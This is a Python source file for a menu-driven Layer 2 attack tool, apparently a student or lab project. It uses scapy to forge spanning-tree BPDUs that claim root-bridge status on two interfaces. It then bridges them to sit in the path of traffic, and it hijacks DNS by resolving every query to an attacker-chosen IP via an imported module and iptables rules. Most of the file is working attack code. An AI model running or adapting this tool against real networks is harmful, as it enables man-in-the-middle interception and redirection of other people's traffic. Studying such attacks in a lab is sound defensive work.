import sys
import threading
import os
import netifaces
import curses
import json
import ipaddress
import create_bridge
import hijack_dns
from types import SimpleNamespace
from platform import system
from scapy.all import *
from scapy.contrib.dtp import DTP, DTPDomain, DTPStatus, DTPType, DTPNeighbor
from scapy.layers.l2 import LLC, SNAP, Dot3
from time import sleep
from typing import Optional
import subprocess

try:
    with open('configs/config', 'r') as f:
        config = json.load(f, object_hook=lambda c: SimpleNamespace(**c))
except FileNotFoundError:
    print("Config file not found int ./configs")
    sys.exit(1)

try:
    with open('configs/attacks', 'r') as f:
        attacks = json.load(f, object_hook=lambda atk: SimpleNamespace(**atk))
except FileNotFoundError:
    print("Attack file not found in ./configs")
    sys.exit(1)

choices = [getattr(getattr(attacks, attr), 'start', None) for attr in vars(attacks) if
           attr != 'quit' and getattr(getattr(attacks, attr), 'enabled', False)] + [getattr(attacks, 'quit')]
verbose = config.verbose
stdscr: Optional[curses.window] = None  # For GUI
has_iptables = False
dns_hijack_counter = 0
stop_hijack_event = threading.Event()
stop_dtp_event = threading.Event()
system_interfaces = netifaces.interfaces()
banner = r""" (           (                                          
 )\ )  *   ) )\ )     (         )    )               )  
(()/(` )  /((()/(     )\     ( /( ( /(    )       ( /(  
 /(_))( )(_))/(_)) ((((_)(   )\()))\())( /(   (   )\()) 
(_)) (_(_())(_))    )\ _ )\ (_))/(_))/ )(_))  )\ ((_)\  
/ __||_   _|| _ \   (_)_\(_)| |_ | |_ ((_)_  ((_)| |(_) 
\__ \  | |  |  _/    / _ \  |  _||  _|/ _` |/ _| | / /  
|___/  |_|  |_|     /_/ \_\  \__| \__|\__,_|\__| |_\_\  
Authors: Jellyyyyyyy, Helihi, Nichonoob, VictorTZY

Use Arrow keys to navigate and Enter to choose an option
"""


def hijack(event, interfaces, pkt):
    pkt[0].src = attacks.hijack.settings.mac_address
    pkt[0].rootid = 0
    pkt[0].rootmac = attacks.hijack.settings.mac_address
    pkt[0].bridgeid = 0
    pkt[0].bridgemac = attacks.hijack.settings.mac_address
    while not event.is_set():
        for interface in interfaces:
            if interface == interfaces[0]:
                pkt[0].pathcost = attacks.hijack.settings.interface1_pathcost
            elif interface == interfaces[1]:
                pkt[0].pathcost = attacks.hijack.settings.interface2_pathcost
            sendp(pkt[0], loop=0, verbose=0, iface=interface)
        sleep(attacks.hijack.settings.interval)


def launch_stp_atk(interfaces):
    pkt = sniff(filter="ether dst 01:80:c2:00:00:00", count=1, iface=interfaces)
    stp_thread = threading.Thread(target=hijack, args=(stop_hijack_event, interfaces, pkt,))
    stp_thread.daemon = True
    stp_thread.start()


def enable_forwarding(bridge_name: str, interfaces: list):
    create_bridge.start(bridge_name, interfaces, verbose=verbose)


def disable_forwarding(bridge_name: str):
    create_bridge.stop(bridge_name, verbose=verbose)


def enable_dns_hijack(fakeip, interfaces):
    global has_iptables, dns_hijack_counter
    hijack_dns.start(fakeip, interfaces, dns_hijack_counter, verbose=verbose)
    if attacks.dns.settings.use_iptables:
        hijack_dns.iptables("create")
        has_iptables = True


def disable_dns_hijack():
    global has_iptables, dns_hijack_counter
    hijack_dns.stop(dns_hijack_counter, verbose=verbose)
    if attacks.dns.settings.use_iptables:
        hijack_dns.iptables("remove")
        has_iptables = False
    dns_hijack_counter += 1


def display_banner(extra=""):
    try:
        stdscr.addstr(banner + extra)
    except Exception:
        pass


def select_option(options, title):
    selection = 0
    while True:
        stdscr.clear()
        stdscr.addstr(f"{banner}\n\n{title}:\n")
        for i, option in enumerate(options):
            if i == selection:
                stdscr.addstr(f">>> {option}\n")
            else:
                stdscr.addstr(f"    {option}\n")

        c = stdscr.getch()
        if c == curses.KEY_UP and selection > 0:
            selection -= 1
        elif c == curses.KEY_DOWN and selection < len(options) - 1:
            selection += 1
        elif c == curses.KEY_ENTER or c == 10 or c == 13:  # Enter key
            stdscr.clear()
            stdscr.refresh()
            display_banner("\n")
            break

    return options[selection]


def get_user_input(prompt, type_check: tuple = (int, float, str, bool, complex)):
    """
    Gets the user input in the GUI.
    prompt : str - Enter a prompt to let the user know what input they should enter
    type_check : tuple - Provide a tuple of acceptable data types (Optional)
    Note: If user enters empty string, it will not go through the type check. Program should account for returning
    empty strings which count towards cancelling the input.
    """
    stdscr.clear()
    display_banner()
    while True:
        stdscr.addstr("\n" + prompt)
        stdscr.refresh()
        curses.echo()
        user_input = stdscr.getstr().decode('utf-8')

        if user_input == "":
            return ""

        for t in type_check:
            try:
                # Special handling for bool because bool('False') is True
                if t is bool:
                    if user_input.lower() == 'false':
                        curses.noecho()
                        return False
                    elif user_input.lower() == 'true':
                        curses.noecho()
                        return True
                    else:
                        raise ValueError
                converted_input = t(user_input)
            except ValueError:
                continue
            else:
                # Input is of the correct type
                curses.noecho()
                return converted_input

        stdscr.addstr("\nInvalid input. Please enter a value of type(s): " + ', '.join(str(t) for t in type_check))
        stdscr.refresh()


def select_interface(n):
    stdscr.addstr(banner)
    interface = select_option(system_interfaces, f'Please choose an interface for interface {n}. Note that only Ethernet interfaces can be used')
    system_interfaces.remove(interface)
    stdscr.addstr(f"\nYou selected {interface} for interface {n}. Press any key to continue\n")
    stdscr.getch()
    return interface


def get_iface_ip(interface):
    try:
        if "No interface available" in interface:
            return "No interface"
        return netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
    except KeyError:
        return "No IP"


def replace_choice(old, new):
    choices.insert(choices.index(old), new)
    choices.remove(old)


def gui(stdscr_gui):
    display_banner(f"\n\nVersion: {config.version}\n\n\nPress any key to Start\n")
    stdscr_gui.getch()

    system_interfaces.sort()  # QoL
    if len(system_interfaces) == 0:
        print("You need at least 1 network interface. Exiting...")
        sys.exit(1)
    if len(system_interfaces) == 1:
        interface1 = system_interfaces[0]
        interface2 = "No interface available - Packet forwarding cannot be enabled."
        selected_interfaces = system_interfaces
        choices.remove(attacks.forward.start)
    elif len(system_interfaces) == 2 and config.skip_choosing_interfaces:
        interface1 = system_interfaces[0]
        interface2 = system_interfaces[1]
        selected_interfaces = system_interfaces
    else:
        interface1 = select_interface(1)
        interface2 = select_interface(2)
        selected_interfaces = [interface1, interface2]

    ip1 = get_iface_ip(interface1)
    ip2 = get_iface_ip(interface2)

    while True:
        display = f"Interface 1: {interface1} ({ip1})\nInterface 2: {interface2} ({ip2})\n\nChoose what to do"
        action = select_option(choices, display)

        if action == attacks.quit:
            disable_forwarding(attacks.forward.settings.bridge_name)
            return

        if action == attacks.hijack.start:
            stdscr_gui.addstr(f"\nAttempting to hijacking root bridge...\n")
            stdscr_gui.refresh()
            stop_hijack_event.clear()
            launch_stp_atk(selected_interfaces)
            replace_choice(attacks.hijack.start, attacks.hijack.stop)
            stdscr_gui.addstr(f"Hijack started. Press any key to return\n")

        elif action == attacks.hijack.stop:
            stdscr_gui.addstr(f"\nStopping root bridge hijacking...\n")
            stdscr_gui.refresh()
            stop_hijack_event.set()
            sleep(config.stop_time)
            replace_choice(attacks.hijack.stop, attacks.hijack.start)
            stdscr_gui.addstr(f"Stopped hijack. Press any key to return\n")

        elif action == attacks.forward.start:
            enable_forwarding(attacks.forward.settings.bridge_name, selected_interfaces)
            replace_choice(attacks.forward.start, attacks.forward.stop)
            stdscr_gui.addstr(f"\nEnabled packet forwarding. Press any key to return\n")

        elif action == attacks.forward.stop:
            disable_forwarding(attacks.forward.settings.bridge_name)
            replace_choice(attacks.forward.stop, attacks.forward.start)
            stdscr_gui.addstr(f"\nDisabled packet forwarding. Press any key to return\n")

        elif action == attacks.dns.start:
            interfaces_str = display.replace('\nChoose what to do', '')
            fakeip = get_user_input(f"\n{interfaces_str} \
                                    \nWhat IP do you want to resolve DNS queries to? (Enter nothing to cancel) \
                                    \nIP Address: ",
                                    (ipaddress.IPv4Address,))
            if fakeip == "":
                continue
            enable_dns_hijack(fakeip, selected_interfaces)
            sleep(config.stop_time)  # Delay to ensure that thread starts fully
            replace_choice(attacks.dns.start, attacks.dns.stop)
            stdscr_gui.addstr(
                f"Enabled DNS hijacking, resolving all DNS queries to {fakeip}. Press any key to return\n")

        elif action == attacks.dns.stop:
            stdscr_gui.addstr(f"\nStopping DNS hijacking...\n")
            stdscr_gui.refresh()
            disable_dns_hijack()
            sleep(config.stop_time)  # Essential delay to let the thread fully exit before allowing another DNS hijack thread
            replace_choice(attacks.dns.stop, attacks.dns.start)
            stdscr_gui.addstr(f"Disabled DNS hijacking. Press any key to return\n")

        ##################################################################
        # Add more functions here - add attacks in configs/attacks
        ##################################################################

        stdscr_gui.getch()


def check_terminal_size(min_width, min_height):
    height, width = stdscr.getmaxyx()
    curses.endwin()
    if width < min_width or height < min_height:
        return False
    return True


def main():
    global stdscr
    if system() != 'Linux':
        return "This script is only supported on Linux machines."
    if os.geteuid() != 0:
        return "Please run this script with root privileges (sudo)"

    system_interfaces.remove("lo")  # loopback interface cannot be used
    if len(system_interfaces) < 1:
        return "No network interface detected. Not possible to launch attack. "
    elif len(system_interfaces) < 2:
        print("WARNING: Only 1 network interface detected (loopback cannot be used).")
        if input("Forwarding packets will not be possible. Do you wish to continue? (Y/N): ").lower() not in ["y", "ye",
                                                                                                              "yes"]:
            return

    stdscr = curses.initscr()
    curses.cbreak()
    stdscr.keypad(True)

    if not check_terminal_size(90, 30):
        return "Please make your terminal bigger to run the script.\nAt least 90 characters in length, 30 characters in height."

    curses.wrapper(gui)  # Initialise curse GUI


if __name__ == '__main__':
    error = None
    try:
        error = main()
    except KeyboardInterrupt:
        try:
            disable_forwarding(config.bridge_name)
        except Exception:
            pass
    finally:
        if stdscr is not None:
            curses.endwin()
        if has_iptables:
            hijack_dns.iptables("remove")
        if error is not None:
            print(error)
        print("Successfully quit from program. Goodbye :)")
